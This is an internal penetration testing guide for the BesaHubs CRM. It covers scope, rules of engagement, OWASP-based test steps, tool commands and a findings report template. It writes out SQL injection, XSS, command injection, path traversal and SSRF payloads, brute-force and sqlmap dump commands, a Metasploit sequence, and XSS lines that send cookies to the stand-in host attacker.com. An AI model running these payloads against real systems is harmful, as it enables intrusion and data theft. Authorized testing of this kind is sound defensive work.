# Penetration Testing Guide - BesaHubs CRM

> **Last Updated:** October 1, 2025  
> **Version:** 1.0  
> **Classification:** Internal Security Documentation  
> **Maintainer:** BesaHubs Security Team

## Table of Contents

1. [Pre-Test Preparation](#pre-test-preparation)
2. [Red Team Testing Methodology](#red-team-testing-methodology)
3. [Attack Scenarios to Test](#attack-scenarios-to-test)
4. [Security Controls to Verify](#security-controls-to-verify)
5. [Testing Tools & Commands](#testing-tools--commands)
6. [Reporting Template](#reporting-template)
7. [Post-Test Procedures](#post-test-procedures)

---

## Pre-Test Preparation

### Scope Definition

#### In-Scope Systems

- **Production Application:** `https://app.besahubs.com`
- **Staging Environment:** `https://staging.besahubs.com`
- **API Endpoints:** `https://api.besahubs.com/*`
- **Authentication System:** All auth endpoints (`/api/auth/*`)
- **Database Layer:** PostgreSQL (indirect testing via application)

#### Out-of-Scope Systems

- ❌ Third-party services (Stripe, Twilio, SendGrid)
- ❌ Cloud infrastructure provider controls (AWS/Azure consoles)
- ❌ DNS and domain registrar systems
- ❌ Employee personal devices
- ❌ Physical security infrastructure

### Rules of Engagement

#### Testing Windows

- **Staging Environment:** Unrestricted testing allowed 24/7
- **Production Environment:** 
  - **Allowed:** Monday-Thursday, 2:00 AM - 6:00 AM EST (low-traffic hours)
  - **Prohibited:** Friday-Sunday, business hours (9 AM - 6 PM EST)
  - **Blackout Periods:** During product launches, major releases, or holidays

#### Notification Procedures

**Before Testing:**
1. Submit penetration testing request form 5 business days in advance
2. Obtain written approval from CISO and DevOps Lead
3. Notify security@besahubs.com with:
   - Tester name and credentials
   - Testing scope and methodology
   - Start/end times
   - Emergency contact information

**During Testing:**
2. Report critical findings (CVSS >= 9.0) within 1 hour of discovery
3. Halt testing immediately if:
   - Production service degradation detected
   - Data corruption occurs
   - Unintended systems are affected

**After Testing:**
4. Submit preliminary findings within 24 hours
5. Provide detailed report within 5 business days

### Backup and Rollback Procedures

**Pre-Test Backups (Required):**

```bash
# Database backup
pg_dump -h $DB_HOST -U $DB_USER -d besahubs_prod > backup_pre_pentest_$(date +%Y%m%d).sql

# Application state backup
tar -czf app_backup_$(date +%Y%m%d).tar.gz /var/www/besahubs

# Configuration backup
cp -r /etc/nginx/sites-available/besahubs /backup/nginx_$(date +%Y%m%d)
```

**Rollback Plan:**

1. **Database Rollback:** `psql -h $DB_HOST -U $DB_USER -d besahubs_prod < backup_pre_pentest_YYYYMMDD.sql`
2. **Application Rollback:** Deploy previous stable version tag
3. **Cache Clear:** `redis-cli FLUSHALL` (if corrupted)
4. **Session Invalidation:** Force logout all users via token revocation

### Communication Channels

| Incident Type | Contact Method | Response Time SLA |
|---------------|----------------|-------------------|
| **Critical Vulnerability** | security@besahubs.com + Slack #security-alerts | 1 hour |
| **Service Degradation** | devops@besahubs.com + PagerDuty | 15 minutes |
| **Data Breach Suspected** | CISO direct phone + security@besahubs.com | Immediate |
| **General Findings** | security@besahubs.com | 24 hours |

---

## Red Team Testing Methodology

We follow the **OWASP Web Security Testing Guide (WSTG) v4.2** methodology:

### 1. Information Gathering (WSTG-INFO)

**Objective:** Collect information about the target without active exploitation.

#### WSTG-INFO-01: Search Engine Discovery

```bash
# Google dorking for exposed information
site:besahubs.com filetype:pdf
site:besahubs.com inurl:admin
site:besahubs.com intext:"password" OR intext:"api_key"

# GitHub reconnaissance
# Search for: "besahubs.com" API_KEY OR PASSWORD OR SECRET
```

#### WSTG-INFO-02: Fingerprint Web Server

```bash
# Identify server technology
nmap -sV -p 80,443 app.besahubs.com
whatweb https://app.besahubs.com

# Check HTTP headers
curl -I https://app.besahubs.com
```

#### WSTG-INFO-05: Review Web Content for Information Leakage

- Check JavaScript source maps (`*.map` files)
- Review HTML comments for sensitive data
- Analyze error messages for stack traces
- Check `robots.txt` and `sitemap.xml` for hidden endpoints

### 2. Configuration Management (WSTG-CONF)

#### WSTG-CONF-01: Test Network Infrastructure

```bash
# Port scanning
nmap -p- -T4 -A app.besahubs.com

# SSL/TLS configuration
sslscan app.besahubs.com
testssl.sh https://app.besahubs.com
```

#### WSTG-CONF-02: Test Application Platform

```bash
# Identify framework and version
whatweb https://app.besahubs.com
wappalyzer (browser extension)

# Check for known vulnerabilities in detected versions
searchsploit express.js
```

#### WSTG-CONF-06: Test HTTP Methods

```bash
# Test for dangerous HTTP methods
curl -X OPTIONS https://app.besahubs.com/api -v
curl -X TRACE https://app.besahubs.com/api -v
curl -X PUT https://app.besahubs.com/api/users/1 -v
```

### 3. Identity Management (WSTG-IDNT)

#### WSTG-IDNT-01: Test Role Definitions

- Verify separation between Admin, Manager, Agent, and Assistant roles
- Test privilege escalation between roles
- Attempt to access resources beyond role permissions

#### WSTG-IDNT-04: Test Account Enumeration

```bash
# Registration endpoint enumeration
curl -X POST https://app.besahubs.com/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Test123!@#"}'

# Check for different responses between existing/non-existing users
# Valid user: "Email already registered"
# Invalid user: Should NOT reveal user existence
```

### 4. Authentication Testing (WSTG-ATHN)

#### WSTG-ATHN-01: Test Credentials Transport

- Verify all auth endpoints use HTTPS
- Check for password in URL parameters (should not exist)
- Verify secure cookie flags (`HttpOnly`, `Secure`, `SameSite`)

#### WSTG-ATHN-02: Test Default Credentials

```bash
# Test common default credentials
admin:admin
admin:password
administrator:administrator
root:root
test:test
```

#### WSTG-ATHN-03: Test Weak Lockout Mechanism

```bash
# Brute force with account lockout bypass attempts
for i in {1..10}; do
  curl -X POST https://app.besahubs.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"wrong$i\"}"
  sleep 2
done

# Expected: Account locked after 5 attempts for 30 minutes
```

#### WSTG-ATHN-04: Test Bypassing Authentication Schema

- SQL injection in login form: `' OR '1'='1' --`
- NoSQL injection: `{"email": {"$ne": null}, "password": {"$ne": null}}`
- JWT token manipulation (change role/permissions in payload)
- Session fixation attacks

#### WSTG-ATHN-07: Test Weak Password Policy

```bash
# Test password complexity enforcement
curl -X POST https://app.besahubs.com/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"weak"}'

# Expected: Reject passwords < 12 characters, no special chars, no uppercase
```

#### WSTG-ATHN-10: Test MFA Bypass

- Test MFA requirement for Admin/Manager roles
- Attempt to skip MFA verification step
- Test backup code reuse (should be single-use)
- Brute force 6-digit TOTP codes

### 5. Authorization Testing (WSTG-ATHZ)

#### WSTG-ATHZ-01: Test Directory Traversal

```bash
# Path traversal attempts
curl https://app.besahubs.com/api/documents/../../etc/passwd
curl https://app.besahubs.com/api/files?path=../../../etc/hosts

# URL encoding
curl https://app.besahubs.com/api/documents/%2e%2e%2f%2e%2e%2f/etc/passwd
```

#### WSTG-ATHZ-02: Test Bypassing Authorization Schema

```bash
# Horizontal privilege escalation (access other user's data)
# As User A (ID=123), try to access User B's data (ID=456)
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://app.besahubs.com/api/users/456/profile

# Vertical privilege escalation (access higher role resources)
# As Agent, try to access Admin endpoints
curl -H "Authorization: Bearer $AGENT_TOKEN" \
  https://app.besahubs.com/api/admin/users
```

#### WSTG-ATHZ-04: Test for Insecure Direct Object References (IDOR)

```bash
# Enumerate user IDs
for id in {1..100}; do
  curl -H "Authorization: Bearer $TOKEN" \
    https://app.besahubs.com/api/users/$id
done

# Test with UUIDs (if applicable)
curl -H "Authorization: Bearer $TOKEN" \
  https://app.besahubs.com/api/contacts/00000000-0000-0000-0000-000000000001
```

### 6. Session Management (WSTG-SESS)

#### WSTG-SESS-01: Test Session Management Schema

- Verify JWT access token expiration (should be 15 minutes)
- Test refresh token rotation (old token should be invalidated)
- Check token reuse detection (should trigger security alert)

#### WSTG-SESS-02: Test Cookie Attributes

```bash
# Check cookie security attributes
curl -I https://app.besahubs.com/api/auth/login -c cookies.txt

# Expected cookie flags:
# - HttpOnly (prevents JavaScript access)
# - Secure (HTTPS only)
# - SameSite=Strict or Lax (CSRF protection)
```

#### WSTG-SESS-06: Test Logout Functionality

```bash
# Verify token invalidation after logout
# 1. Login and get token
TOKEN=$(curl -X POST https://app.besahubs.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Test123!@#"}' | jq -r '.token')

# 2. Logout
curl -X POST https://app.besahubs.com/api/auth/logout \
  -H "Authorization: Bearer $TOKEN"

# 3. Try to use token again (should fail)
curl -H "Authorization: Bearer $TOKEN" \
  https://app.besahubs.com/api/users/me
```

#### WSTG-SESS-07: Test Session Timeout

- Verify access token expires after 15 minutes
- Test if expired tokens are properly rejected
- Verify refresh token expires after 7 days

### 7. Input Validation (WSTG-INPV)

#### WSTG-INPV-01: Test for SQL Injection

```bash
# Classic SQL injection payloads
curl -X POST https://app.besahubs.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# Time-based blind SQL injection
curl "https://app.besahubs.com/api/contacts?search=test' AND SLEEP(5)--"

# Union-based SQL injection
curl "https://app.besahubs.com/api/properties?id=1 UNION SELECT username,password FROM users--"

# SQLMap automated testing
sqlmap -u "https://app.besahubs.com/api/properties?id=1" \
  --cookie="token=$JWT_TOKEN" \
  --level=5 --risk=3
```

#### WSTG-INPV-02: Test for Stored XSS

```bash
# Create contact with XSS payload
curl -X POST https://app.besahubs.com/api/contacts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "John<script>alert(\"XSS\")</script>",
    "lastName": "Doe",
    "email": "john@example.com"
  }'

# Test rich text fields with HTML injection
curl -X POST https://app.besahubs.com/api/deals \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Deal",
    "description": "<img src=x onerror=alert(document.cookie)>"
  }'
```

#### WSTG-INPV-03: Test for Reflected XSS

```bash
# XSS in URL parameters
curl "https://app.besahubs.com/api/search?q=<script>alert(1)</script>"

# XSS in HTTP headers
curl -H "X-Forwarded-For: <script>alert(1)</script>" \
  https://app.besahubs.com/api/contacts
```

#### WSTG-INPV-05: Test for Command Injection

```bash
# OS command injection in file operations
curl -X POST https://app.besahubs.com/api/import \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.csv; ls -la"

# Test export filename parameter
curl "https://app.besahubs.com/api/export?filename=contacts;whoami"
```

#### WSTG-INPV-12: Test for Server-Side Request Forgery (SSRF)

```bash
# SSRF via URL input fields
curl -X POST https://app.besahubs.com/api/integrations/webhook \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:22"}'

# Try to access internal metadata services
curl -X POST https://app.besahubs.com/api/integrations/webhook \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

### 8. Error Handling (WSTG-ERRH)

#### WSTG-ERRH-01: Test for Improper Error Handling

```bash
# Trigger errors to check for information disclosure
curl https://app.besahubs.com/api/users/invalid-uuid
curl https://app.besahubs.com/api/deals/99999999

# Check for stack traces in responses (should not exist in production)
```

### 9. Cryptography (WSTG-CRYP)

#### WSTG-CRYP-01: Test for Weak Transport Layer Security

```bash
# Test SSL/TLS configuration
testssl.sh https://app.besahubs.com

# Check supported protocols and ciphers
nmap --script ssl-enum-ciphers -p 443 app.besahubs.com

# Expected: TLS 1.2+, strong cipher suites only
```

#### WSTG-CRYP-02: Test for Sensitive Data in Transit

- Monitor network traffic for unencrypted sensitive data
- Verify all API requests use HTTPS
- Check WebSocket connections use WSS (secure WebSocket)

### 10. Business Logic (WSTG-BUSL)

#### WSTG-BUSL-01: Test Business Logic Data Validation

- Test negative numbers in financial fields (commission amounts, deal values)
- Test extremely large values (Integer overflow)
- Test decimal precision (currency calculations)

```bash
# Negative commission amount
curl -X POST https://app.besahubs.com/api/commissions \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"dealId":"123","amount":-10000}'
```

#### WSTG-BUSL-05: Test Number of Times a Function Can Be Used

- Test rate limiting on API endpoints
- Test concurrent request handling
- Test batch operation limits

### 11. Client-Side (WSTG-CLNT)

#### WSTG-CLNT-03: Test for HTML Injection

```bash
# Test HTML injection in user-generated content
curl -X POST https://app.besahubs.com/api/contacts \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "firstName": "<h1>Injected</h1>",
    "notes": "<iframe src=evil.com></iframe>"
  }'
```

---

## Attack Scenarios to Test

### 1. SQL Injection Attacks

**Test All Input Fields:**

| Endpoint | Parameter | Payload |
|----------|-----------|---------|
| `/api/auth/login` | `email` | `admin' OR '1'='1' --` |
| `/api/contacts` | `search` | `' UNION SELECT * FROM users --` |
| `/api/properties` | `filters.city` | `'; DROP TABLE properties; --` |
| `/api/deals` | `id` | `1 OR 1=1` |

**Expected Result:** All inputs should be parameterized. No SQL injection should succeed.

### 2. Cross-Site Scripting (XSS)

**Stored XSS:**
```javascript
// Test in contact notes, deal descriptions, property details
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
```

**Reflected XSS:**
```bash
# Search functionality
GET /api/search?q=<script>alert(1)</script>

# Error messages
GET /api/users/<script>alert(1)</script>
```

**DOM-based XSS:**
```javascript
// Test JavaScript-based rendering
#<img src=x onerror=alert(1)>
```

### 3. CSRF (Cross-Site Request Forgery)

```html
<!-- Test if CSRF tokens are required -->
<form action="https://app.besahubs.com/api/users/delete" method="POST">
  <input type="hidden" name="userId" value="123">
  <input type="submit" value="Click me">
</form>
```

**Expected:** All state-changing operations should require CSRF tokens or verify Origin/Referer headers.

### 4. Authentication Bypass

**Test Scenarios:**
- JWT token manipulation (change `role` in payload)
- Token expiration bypass (use expired token)
- Password reset token reuse
- MFA bypass (skip verification step)
- Session fixation (set session ID before login)

### 5. Authorization Escalation

**Horizontal Escalation (User A → User B):**
```bash
# As regular user, access another user's data
curl -H "Authorization: Bearer $USER_A_TOKEN" \
  https://app.besahubs.com/api/users/$USER_B_ID
```

**Vertical Escalation (Agent → Admin):**
```bash
# As Agent, access Admin endpoints
curl -H "Authorization: Bearer $AGENT_TOKEN" \
  https://app.besahubs.com/api/admin/users
```

### 6. Session Fixation/Hijacking

```bash
# Session fixation
# 1. Set session ID before authentication
# 2. Authenticate with that session ID
# 3. Session ID should change after authentication

# Session hijacking via XSS
<script>
  fetch('https://attacker.com?session='+document.cookie)
</script>
```

### 7. Rate Limit Bypass

**Distributed Attack:**
```bash
# Use multiple IPs to bypass rate limiting
for ip in {1..100}; do
  curl -H "X-Forwarded-For: 192.168.1.$ip" \
    -X POST https://app.besahubs.com/api/auth/login \
    -d '{"email":"victim@example.com","password":"guess1"}'
done
```

**Header Manipulation:**
```bash
# Try different IP headers
curl -H "X-Real-IP: 1.1.1.1" ...
curl -H "X-Forwarded-For: 1.1.1.1" ...
curl -H "X-Client-IP: 1.1.1.1" ...
```

### 8. CAPTCHA Bypass

- Test if CAPTCHA can be reused
- Test if CAPTCHA validation is enforced
- Test automated CAPTCHA solving services
- Test if CAPTCHA can be skipped via API

### 9. Password Brute-Force

```bash
# Hydra brute force
hydra -l admin@besahubs.com -P passwords.txt \
  https-post-form "/api/auth/login:email=^USER^&password=^PASS^:F=Invalid"

# Custom script with common passwords
while read password; do
  curl -X POST https://app.besahubs.com/api/auth/login \
    -d "{\"email\":\"admin@besahubs.com\",\"password\":\"$password\"}"
done < common_passwords.txt
```

**Expected:** Account lockout after 5 attempts, 30-minute cooldown.

### 10. API Abuse and Fuzzing

```bash
# Wfuzz - API endpoint fuzzing
wfuzz -c -z file,wordlist.txt \
  --hc 404 \
  https://app.besahubs.com/api/FUZZ

# Test for undocumented endpoints
/api/debug
/api/internal
/api/admin/backup
/api/test
```

### 11. File Upload Vulnerabilities

```bash
# Upload malicious files
# PHP shell
curl -F "file=@shell.php" https://app.besahubs.com/api/upload

# Execute via SSRF
curl -F "file=@malicious.svg" https://app.besahubs.com/api/documents/upload

# Path traversal in filename
curl -F "file=@test.txt; filename=../../etc/passwd" \
  https://app.besahubs.com/api/upload
```

### 12. Directory Traversal

```bash
# Various encoding techniques
curl https://app.besahubs.com/api/documents/../../../etc/passwd
curl https://app.besahubs.com/api/documents/..%2F..%2F..%2Fetc%2Fpasswd
curl https://app.besahubs.com/api/documents/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 13. Server-Side Request Forgery (SSRF)

```bash
# Access internal services
curl -X POST https://app.besahubs.com/api/webhooks \
  -d '{"url":"http://localhost:6379"}' # Redis
  
# Cloud metadata access
curl -X POST https://app.besahubs.com/api/webhooks \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

---

## Security Controls to Verify

### Authentication & Access Control

| Control | Expected Behavior | Test Method |
|---------|-------------------|-------------|
| **Password Complexity** | Min 12 chars, uppercase, lowercase, number, special char | Try registering with weak passwords |
| **Account Lockout** | 5 failed attempts → 30-min lockout | Automate failed login attempts |
| **MFA for Admin/Manager** | Required for privileged roles | Login as Admin without MFA |
| **Token Expiration** | Access: 15 min, Refresh: 7 days | Wait for expiration and test |
| **Token Rotation** | New refresh token on each use | Use refresh token twice |
| **Session Revocation** | Logout invalidates all tokens | Use token after logout |

### Data Protection

| Control | Expected Behavior | Test Method |
|---------|-------------------|-------------|
| **PII Encryption at Rest** | SSN, passport, financial data encrypted | Direct database query |
| **Data Masking** | Sensitive data masked in logs | Check application logs |
| **Audit Log Integrity** | Hash chain prevents tampering | Attempt to modify audit logs |
| **GDPR Data Export** | User can export all their data | Request data export |
| **GDPR Data Deletion** | User can delete their account + data | Request account deletion |
| **Data Retention** | Deleted data purged after 30 days | Verify deletion schedules |

### Network & API Security

| Control | Expected Behavior | Test Method |
|---------|-------------------|-------------|
| **HTTPS Enforcement** | HTTP redirects to HTTPS | Access via `http://` |
| **HSTS Header** | `Strict-Transport-Security` present | Check response headers |
| **CSP Header** | Content Security Policy enforced | Check response headers |
| **X-Frame-Options** | `DENY` or `SAMEORIGIN` | Attempt iframe embedding |
| **CORS Policy** | Only whitelisted origins allowed | Request from unauthorized origin |
| **Rate Limiting (Auth)** | Max 5 requests per 15 min | Exceed rate limit |
| **Rate Limiting (API)** | Max 100 requests per 15 min | Exceed rate limit |
| **Request Size Limit** | Max 10MB request body | Send 50MB request |
| **CAPTCHA Verification** | Required after 3 failed logins | Trigger CAPTCHA |

### Input Validation & Sanitization

| Control | Expected Behavior | Test Method |
|---------|-------------------|-------------|
| **XSS Prevention** | HTML tags stripped/escaped | Inject `<script>` tags |
| **SQL Injection Protection** | Parameterized queries only | SQL injection payloads |
| **Command Injection Protection** | No OS command execution | Command injection payloads |
| **Path Traversal Protection** | File access restricted | `../../etc/passwd` attempts |
| **SSRF Protection** | Cannot access internal IPs | Webhook to `localhost` |
| **File Upload Validation** | Only allowed file types | Upload `.php`, `.exe` files |

### Monitoring & Logging

| Control | Expected Behavior | Test Method |
|---------|-------------------|-------------|
| **Failed Login Tracking** | All failures logged | Check audit logs |
| **Token Reuse Detection** | Alert on refresh token reuse | Reuse refresh token |
| **Privilege Escalation Alerts** | Alert on role changes | Change user role |
| **Geo-IP Blocking** | Block traffic from banned countries | Use VPN/proxy |
| **Anomaly Detection** | Alert on unusual activity | High-frequency requests |

---

## Testing Tools & Commands

### 1. Burp Suite Professional

**Use Cases:** Manual security testing, session analysis, repeater, intruder

```bash
# Configure Burp as proxy
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Common Burp Suite workflows:
# 1. Intercept requests → Modify → Forward
# 2. Send to Repeater → Modify and replay
# 3. Send to Intruder → Automated fuzzing
# 4. Spider → Discover all endpoints
```

**Key Features:**
- **Scanner:** Automated vulnerability detection
- **Repeater:** Manual request modification
- **Intruder:** Brute force and fuzzing
- **Sequencer:** Token randomness analysis

### 2. OWASP ZAP (Automated Scanning)

```bash
# Baseline scan (passive only)
docker run -v $(pwd):/zap/wrk/:rw \
  -t owasp/zap2docker-stable \
  zap-baseline.py -t https://app.besahubs.com \
  -r zap_baseline_report.html

# Full scan (active + passive)
docker run -v $(pwd):/zap/wrk/:rw \
  -t owasp/zap2docker-stable \
  zap-full-scan.py -t https://app.besahubs.com \
  -r zap_full_report.html

# Authenticated scan
docker run -v $(pwd):/zap/wrk/:rw \
  -t owasp/zap2docker-stable \
  zap-full-scan.py -t https://app.besahubs.com \
  -c zap_config.conf
```

### 3. SQLMap (SQL Injection)

```bash
# Basic SQL injection test
sqlmap -u "https://app.besahubs.com/api/properties?id=1" \
  --cookie="token=JWT_TOKEN_HERE" \
  --batch

# Enumerate databases
sqlmap -u "https://app.besahubs.com/api/properties?id=1" \
  --cookie="token=JWT_TOKEN_HERE" \
  --dbs

# Dump specific table
sqlmap -u "https://app.besahubs.com/api/properties?id=1" \
  --cookie="token=JWT_TOKEN_HERE" \
  -D besahubs_db -T users --dump

# POST request SQL injection
sqlmap -u "https://app.besahubs.com/api/auth/login" \
  --data='{"email":"*","password":"test"}' \
  --level=5 --risk=3
```

### 4. Nikto (Web Server Scanning)

```bash
# Basic scan
nikto -h https://app.besahubs.com

# Comprehensive scan with tuning
nikto -h https://app.besahubs.com \
  -Tuning x 6 7 8 9 \
  -output nikto_report.html -Format html

# SSL/TLS specific tests
nikto -h https://app.besahubs.com -ssl
```

### 5. Nmap (Network Reconnaissance)

```bash
# Basic port scan
nmap -p- app.besahubs.com

# Service version detection
nmap -sV -p 80,443,22,3306,5432 app.besahubs.com

# Vulnerability scanning
nmap --script vuln app.besahubs.com

# SSL/TLS enumeration
nmap --script ssl-enum-ciphers -p 443 app.besahubs.com
```

### 6. Metasploit (Exploitation Framework)

```bash
# Start Metasploit console
msfconsole

# Search for relevant exploits
msf6 > search type:exploit platform:linux apache

# Use specific exploit
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 > set RHOST app.besahubs.com
msf6 > set RPORT 443
msf6 > set SSL true
msf6 > exploit
```

### 7. Hydra (Password Cracking)

```bash
# HTTP POST form brute force
hydra -l admin@besahubs.com -P /usr/share/wordlists/rockyou.txt \
  app.besahubs.com https-post-form \
  "/api/auth/login:email=^USER^&password=^PASS^:F=Invalid credentials"

# SSH brute force (if applicable)
hydra -l root -P passwords.txt ssh://app.besahubs.com

# Custom rate limiting (slower)
hydra -l admin@besahubs.com -P passwords.txt \
  -t 4 -w 30 \
  app.besahubs.com https-post-form "/api/auth/login:..."
```

### 8. WPScan / DirBuster (Directory Enumeration)

```bash
# Dirbuster (GUI tool)
dirbuster

# FFUF (faster alternative)
ffuf -u https://app.besahubs.com/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fc 404

# Gobuster
gobuster dir -u https://app.besahubs.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50
```

### 9. JWT Tool (Token Analysis)

```bash
# Decode JWT token
jwt-tool $JWT_TOKEN

# Test for algorithm confusion (None algorithm)
jwt-tool $JWT_TOKEN -X a

# Brute force JWT secret (if HS256)
jwt-tool $JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Tamper with claims
jwt-tool $JWT_TOKEN -T
```

### 10. Nuclei (Vulnerability Scanner)

```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Run all templates
nuclei -u https://app.besahubs.com

# Run specific severity
nuclei -u https://app.besahubs.com -severity critical,high

# Custom template
nuclei -u https://app.besahubs.com -t custom-template.yaml
```

---

## Reporting Template

### Executive Summary

**Overview:**
A comprehensive penetration test was conducted on the BesaHubs CRM application from [START_DATE] to [END_DATE]. The assessment covered [SCOPE] and identified [X] vulnerabilities.

**Risk Summary:**

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | X | X% |
| High | X | X% |
| Medium | X | X% |
| Low | X | X% |
| Informational | X | X% |

**Key Findings:**
1. [Brief description of most critical finding]
2. [Second most critical finding]
3. [Third finding]

**Recommendations Priority:**
1. **Immediate (0-7 days):** [Critical vulnerabilities]
2. **Short-term (1-4 weeks):** [High-risk vulnerabilities]
3. **Long-term (1-3 months):** [Medium-risk improvements]

---

### Vulnerability Findings

#### Finding #1: [Vulnerability Name]

**Severity:** Critical (CVSS 9.8)  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Affected Component:**
- **URL:** `https://app.besahubs.com/api/auth/login`
- **Parameter:** `email`
- **HTTP Method:** POST

**Description:**
[Detailed technical description of the vulnerability]

**Impact:**
- **Confidentiality:** High - Attacker can access all user data
- **Integrity:** High - Attacker can modify or delete data
- **Availability:** High - Attacker can disrupt service

**Proof of Concept (PoC):**

```bash
# Step 1: Send malicious request
curl -X POST https://app.besahubs.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# Step 2: Observe successful authentication
# Response: {"success": true, "token": "eyJhbGc..."}

# Step 3: Use token to access admin endpoints
curl -H "Authorization: Bearer eyJhbGc..." \
  https://app.besahubs.com/api/admin/users
```

**Evidence:**
- Screenshot: `screenshots/sqli_auth_bypass.png`
- HTTP Request: `evidence/sqli_request.txt`
- HTTP Response: `evidence/sqli_response.txt`

**Remediation:**
1. **Immediate:** Implement parameterized queries using Sequelize ORM
2. **Short-term:** Add input validation middleware (Joi/Celebrate)
3. **Long-term:** Deploy WAF (Web Application Firewall) with SQL injection rules

**Code Example (Fix):**

```javascript
// ❌ Vulnerable code
const user = await sequelize.query(
  `SELECT * FROM users WHERE email = '${email}'`
);

// ✅ Secure code
const user = await User.findOne({
  where: { email: email } // Sequelize auto-parameterizes
});
```

**Remediation Validation:**
After implementing the fix, re-test with:
```bash
curl -X POST https://app.besahubs.com/api/auth/login \
  -d '{"email":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'
# Expected: {"error": "Invalid credentials"}
```

**References:**
- OWASP Top 10 2021 - A03:2021 Injection
- CWE-89: SQL Injection
- MITRE ATT&CK: T1190 - Exploit Public-Facing Application

---

#### Finding #2: [Next Vulnerability]

[Repeat same format for all findings]

---

### Compliance Impact Assessment

**GDPR Implications:**
- [Finding X] violates Article 32 (Security of Processing)
- [Finding Y] may lead to Article 33 (Data Breach Notification) requirements

**SOC 2 Type II:**
- [Finding X] impacts CC6.1 (Logical Access Controls)
- [Finding Y] impacts CC7.2 (System Monitoring)

**OWASP Top 10 Coverage:**
| OWASP Category | Findings | Status |
|----------------|----------|--------|
| A01:2021 - Broken Access Control | 3 findings | ⚠️ Needs attention |
| A02:2021 - Cryptographic Failures | 0 findings | ✅ Compliant |
| A03:2021 - Injection | 2 findings | ⚠️ Needs attention |
| ... | ... | ... |

---

### Remediation Roadmap

**Phase 1: Critical Fixes (Week 1)**
- [ ] Fix SQL injection in authentication (Finding #1)
- [ ] Implement proper session management (Finding #2)
- [ ] Deploy emergency patches

**Phase 2: High-Priority Fixes (Weeks 2-4)**
- [ ] Fix XSS vulnerabilities (Findings #3, #4, #5)
- [ ] Implement CSRF protection (Finding #6)
- [ ] Strengthen password policy (Finding #7)

**Phase 3: Medium-Priority Improvements (Months 2-3)**
- [ ] Enhance rate limiting (Finding #8)
- [ ] Implement additional logging (Finding #9)
- [ ] Security training for developers

**Phase 4: Long-Term Security Posture**
- [ ] Implement WAF (Web Application Firewall)
- [ ] Deploy SIEM (Security Information and Event Management)
- [ ] Establish bug bounty program
- [ ] Quarterly penetration testing

---

### Appendix

**A. Test Methodology**
- OWASP Web Security Testing Guide v4.2
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115

**B. Tools Used**
- Burp Suite Professional v2023.10
- OWASP ZAP v2.14
- SQLMap v1.7
- Nmap v7.94
- Metasploit Framework v6.3

**C. Test Accounts**
- `pentest_admin@besahubs.com` (Admin role)
- `pentest_agent@besahubs.com` (Agent role)
- `pentest_user@besahubs.com` (Basic user)

**D. Out-of-Scope Items**
- Physical security testing
- Social engineering attacks
- DoS/DDoS attacks
- Third-party service vulnerabilities

---

## Post-Test Procedures

### 1. Vulnerability Remediation Tracking

**Create Remediation Tickets:**

```markdown
# Ticket Template

**Title:** [PENTEST-001] SQL Injection in Authentication Endpoint

**Priority:** P0 (Critical)
**Assignee:** Backend Team Lead
**Due Date:** [7 days from finding]

**Description:**
SQL injection vulnerability discovered in `/api/auth/login` endpoint.

**Reproduction Steps:**
1. Send POST request to /api/auth/login
2. Use payload: `{"email":"admin' OR '1'='1","password":"anything"}`
3. Observe unauthorized authentication

**Remediation Tasks:**
- [ ] Replace raw SQL with Sequelize parameterized queries
- [ ] Add input validation middleware (Joi)
- [ ] Deploy to staging for QA testing
- [ ] Schedule penetration tester for re-test
- [ ] Deploy to production
- [ ] Update security documentation

**Acceptance Criteria:**
- [ ] SQL injection payloads properly rejected
- [ ] No information disclosure in error messages
- [ ] Penetration tester confirms fix
```

### 2. Re-Testing Verification

**Re-Test Checklist:**

| Vulnerability | Original Severity | Fix Deployed | Re-Test Date | Status |
|---------------|-------------------|--------------|--------------|--------|
| SQL Injection (AUTH-001) | Critical | 2025-10-05 | 2025-10-08 | ✅ Fixed |
| XSS in Contacts (XSS-001) | High | 2025-10-06 | 2025-10-09 | ⏳ Pending |
| IDOR in Users (AUTHZ-001) | High | - | - | ❌ Not Fixed |

**Re-Test Process:**
1. Receive notification that fix is deployed
2. Wait 24 hours for production stability
3. Re-run original PoC exploit
4. Verify vulnerability is mitigated
5. Test for bypass techniques
6. Update ticket with results

### 3. Security Control Effectiveness Report

**Metrics to Track:**

```markdown
# Security Controls Effectiveness Report

## Period: Q4 2025
